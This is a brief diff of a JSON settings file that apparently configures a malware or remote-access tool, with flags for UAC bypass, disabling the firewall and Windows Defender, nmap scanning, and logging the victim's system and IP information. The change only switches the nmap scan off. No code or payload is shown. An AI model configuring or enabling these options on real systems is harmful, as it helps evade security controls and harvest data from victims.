@@ -2,7 +2,7 @@
     "%uac_bypass%": true,
     "%disable_firewall%": false,
     "%disable_defender%": false,
-    "%nmap_scan%": true,
+    "%nmap_scan%": false,
     "%log_sysinfo%": true,
     "%log_ipinfo%": true
 }
